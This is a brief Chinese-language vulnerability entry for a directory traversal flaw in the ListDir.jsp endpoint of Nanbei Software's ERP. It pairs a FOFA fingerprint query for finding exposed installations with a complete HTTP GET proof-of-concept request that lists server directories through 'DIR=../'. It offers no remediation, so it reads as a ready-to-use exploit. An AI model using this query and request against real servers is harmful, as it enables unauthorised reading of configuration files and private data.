## 南北软件ERP-ListDir.jsp-目录遍历漏洞

## 一、漏洞简介
南北软件ERP ListDir.jsp接口对用户输入过滤不当导致路径遍历，攻击者可读取配置文件等敏感信息实现隐私数据获取，也可读取关键配置实现进一步利用。

## fofa
```
body="IdInstalClient" || title="snsoft" || body="/snsoft/Login.jsp" || icon_hash="-1369926570"
```

## poc
```
GET /snssoft/tool/ListDir.jsp?DIR=../ HTTP/1.1
Host: [已模糊处理]
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```
